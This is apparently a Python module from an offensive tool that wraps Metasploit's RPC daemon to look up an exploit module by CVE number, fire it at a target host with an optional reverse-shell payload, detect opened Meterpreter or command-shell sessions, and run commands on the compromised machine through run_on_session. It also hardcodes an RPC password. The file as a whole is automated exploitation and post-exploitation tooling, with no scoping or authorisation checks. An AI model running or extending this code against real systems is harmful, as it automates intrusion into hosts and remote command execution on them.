from __future__ import annotations

import os
import re
import socket
import subprocess
import time
from typing import Any

from pymetasploit3.msfrpc import MsfRpcClient, MsfError, MsfAuthError

MSFRPCD_PORT = 55554
MSFRPCD_PASS = "skoll_msf_rpc_2024"
RESTART_DELAY = 3
MAX_RETRIES = 15
RETRY_DELAY = 2


class MSFManager:
    def __init__(self, password: str = MSFRPCD_PASS, port: int = MSFRPCD_PORT):
        self.password = password
        self.port = port
        self._client: MsfRpcClient | None = None

    def start(self) -> None:
        if self._client:
            try:
                _ = self._client.consoles.list
                return
            except Exception:
                self._client = None

        if self._is_port_open():
            self._connect()
            if self._client:
                return
            self._stop_existing()

        self._emit(f"[MSF] Starting msfrpcd on port {self.port}...")
        try:
            subprocess.Popen(
                [
                    "msfrpcd", "-P", self.password, "-p", str(self.port),
                    "-S", "-a", "127.0.0.1",
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                close_fds=True,
            )
        except FileNotFoundError:
            self._emit("[MSF] msfrpcd not found, RPC unavailable")
            return
        except Exception as e:
            self._emit(f"[MSF] Failed to start msfrpcd: {e}")
            return

        for _ in range(MAX_RETRIES):
            if self._is_port_open():
                break
            time.sleep(RETRY_DELAY)

        if not self._is_port_open():
            self._emit("[MSF] msfrpcd failed to start (timeout)")
            return
        self._connect()

    def _connect(self) -> None:
        for attempt in range(1, MAX_RETRIES + 1):
            try:
                self._client = MsfRpcClient(
                    self.password, port=self.port, ssl=False
                )
                _ = self._client.consoles.list
                self._emit(f"[MSF] Connected via RPC (attempt {attempt})")
                return
            except (MsfError, MsfAuthError, socket.error, ConnectionRefusedError) as e:
                if attempt < MAX_RETRIES:
                    time.sleep(RETRY_DELAY)
                else:
                    self._emit(f"[MSF] Failed to connect after {MAX_RETRIES} attempts: {e}")
                    self._client = None

    def get_client(self) -> MsfRpcClient | None:
        if self._client:
            try:
                _ = self._client.consoles.list
                return self._client
            except Exception:
                self._client = None
        self.start()
        return self._client

    def search_cve(self, cve_id: str) -> dict[str, Any] | None:
        client = self.get_client()
        if not client:
            return self._search_cve_fallback(cve_id)

        cve_num = cve_id.replace("CVE-", "").strip()
        try:
            console = client.consoles.console()
            console.write(f"search cve:{cve_num}\n")
            time.sleep(4)
            data = console.read()
            output = data.get("data", "")
            console.destroy()

            match = re.search(
                r"\d+\s+(exploit|auxiliary|payload)/\S+",
                output,
            )
            if match:
                module = match.group(0).strip().split(None, 1)[-1]
                return {"module": module, "source": "rpc", "cve": cve_id}
            return None
        except Exception as e:
            self._emit(f"[MSF] RPC search failed: {e}, falling back to subprocess")
            return self._search_cve_fallback(cve_id)

    def _search_cve_fallback(self, cve_id: str) -> dict[str, Any] | None:
        cve_num = cve_id.replace("CVE-", "").strip()
        try:
            result = subprocess.run(
                ["msfconsole", "-q", "-c", f"search cve:{cve_num}; exit"],
                capture_output=True, text=True, timeout=60,
            )
            output = result.stdout + result.stderr
            match = re.search(
                r"\d+\s+(exploit|auxiliary|payload)/\S+",
                output,
            )
            if match:
                module = match.group(0).strip().split(None, 1)[-1]
                return {"module": module, "source": "subprocess"}
            return None
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
            return None

    def execute_module(
        self,
        module: str,
        rhosts: str,
        rport: int,
        payload: str = "",
        lhost: str = "",
        lport: int = 4444,
        options: dict[str, Any] | None = None,
        timeout: int = 120,
    ) -> dict[str, Any]:
        client = self.get_client()
        if not client:
            return self._execute_module_fallback(
                module, rhosts, rport, payload, lhost, lport, options, timeout
            )

        try:
            console = client.consoles.console()
            console.write(f"use {module}\n")
            console.write(f"set RHOSTS {rhosts}\n")
            console.write(f"set RPORT {rport}\n")
            if payload:
                console.write(f"set PAYLOAD {payload}\n")
                console.write(f"set LHOST {lhost}\n")
                console.write(f"set LPORT {lport}\n")
            console.write("set VERBOSE true\n")
            if options:
                for k, v in options.items():
                    console.write(f"set {k} {v}\n")
            console.write("run -z\n")
            console.write("sessions -l\n")

            time.sleep(5)
            elapsed = 5
            output_parts: list[str] = []
            session_id: int | None = None
            while elapsed < timeout:
                time.sleep(2)
                elapsed += 2
                data = console.read()
                chunk = data.get("data", "")
                if chunk:
                    output_parts.append(chunk)

                session_match = re.search(
                    r"(Meterpreter|Command shell)\s+session\s+(\d+)\s+opened",
                    chunk, re.IGNORECASE,
                )
                if session_match:
                    session_id = int(session_match.group(2))
                    break

                if re.search(r"\[\-\]\s+Exploit\s+failed", chunk, re.IGNORECASE):
                    break

                busy = data.get("busy", False)
                if not busy and not chunk.strip():
                    break
                if not busy:
                    time.sleep(1)
                    data2 = console.read()
                    chunk2 = data2.get("data", "")
                    if chunk2:
                        output_parts.append(chunk2)
                    break

            output = "\n".join(output_parts)
            exploit_failed = bool(re.search(r"\[\-\]\s+Exploit\s+failed", output, re.IGNORECASE))
            success = session_id is not None or (
                bool(re.search(r"\[\+\]\s+", output, re.IGNORECASE)) and not exploit_failed
            )

            console.destroy()

            return {
                "success": success,
                "session_id": session_id,
                "output": output[:5000],
                "source": "rpc",
            }
        except Exception as e:
            self._emit(f"[MSF] RPC execute failed: {e}, falling back to subprocess")
            return self._execute_module_fallback(
                module, rhosts, rport, payload, lhost, lport, options, timeout
            )

    def _execute_module_fallback(
        self,
        module: str, rhosts: str, rport: int,
        payload: str, lhost: str, lport: int,
        options: dict[str, Any] | None, timeout: int,
    ) -> dict[str, Any]:
        lines = [
            f"use {module}",
            f"set RHOSTS {rhosts}",
            f"set RPORT {rport}",
        ]
        if payload:
            lines.extend([f"set PAYLOAD {payload}", f"set LHOST {lhost}", f"set LPORT {lport}"])
        lines.append("set VERBOSE true")
        if options:
            for k, v in options.items():
                lines.append(f"set {k} {v}")
        lines.append("run")
        lines.append("sessions -l")
        lines.append("exit")

        rc_path = f"/tmp/cve2msf/fallback_{int(time.time())}.rc"
        os.makedirs("/tmp/cve2msf", exist_ok=True)
        with open(rc_path, "w") as f:
            f.write("\n".join(lines))

        try:
            result = subprocess.run(
                ["msfconsole", "-q", "-r", rc_path],
                capture_output=True, text=True, timeout=timeout,
            )
            output = result.stdout + result.stderr
            session_match = re.search(
                r"(Meterpreter|Command shell)\s+session\s+(\d+)\s+opened",
                output, re.IGNORECASE,
            )
            session_id = int(session_match.group(2)) if session_match else None
            exploit_failed = bool(re.search(r"\[\-\]\s+Exploit\s+failed", output, re.IGNORECASE))
            success = session_id is not None or (
                bool(re.search(r"\[\+\]\s+", output, re.IGNORECASE)) and not exploit_failed
            )
            return {
                "success": success,
                "session_id": session_id,
                "output": output[:5000],
                "source": "subprocess",
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "session_id": None, "output": "[TIMEOUT]", "source": "subprocess"}
        except FileNotFoundError:
            return {"success": False, "session_id": None, "output": "[ERR] msfconsole not found", "source": "subprocess"}
        except Exception as e:
            return {"success": False, "session_id": None, "output": f"[ERR] {e}", "source": "subprocess"}

    def get_sessions(self) -> list[dict[str, Any]]:
        client = self.get_client()
        if not client:
            return []
        try:
            return client.sessions.list
        except Exception:
            return []

    def stop_session(self, session_id: int) -> bool:
        client = self.get_client()
        if not client:
            return False
        try:
            client.sessions.stop(session_id)
            return True
        except Exception:
            return False

    def run_on_session(self, session_id: int, command: str) -> str | None:
        client = self.get_client()
        if not client:
            return None
        try:
            return client.sessions.interact(session_id, command)
        except Exception:
            return None

    def stop(self) -> None:
        self._emit("[MSF] Stopping msfrpcd...")
        try:
            subprocess.run(
                ["fuser", "-k", f"{self.port}/tcp"],
                capture_output=True, timeout=5,
            )
            time.sleep(1)
        except Exception:
            pass
        self._client = None

    def _is_port_open(self) -> bool:
        try:
            with socket.create_connection(("127.0.0.1", self.port), timeout=2):
                return True
        except (socket.error, OSError):
            return False

    def _stop_existing(self) -> None:
        try:
            result = subprocess.run(
                ["fuser", "-k", f"{self.port}/tcp"],
                capture_output=True, text=True, timeout=5,
            )
            self._emit(f"[MSF] Killed existing process on port {self.port}")
            time.sleep(2)
        except Exception:
            pass

    def _emit(self, msg: str) -> None:
        print(msg)

    @staticmethod
    def _detect_lhost() -> str:
        try:
            r = subprocess.run(
                ["ip", "route", "get", "1"],
                capture_output=True, text=True, timeout=5,
            )
            m = re.search(r"src\s+(\d+\.\d+\.\d+\.\d+)", r.stdout)
            if m:
                return m.group(1)
        except Exception:
            pass
        return "127.0.0.1"
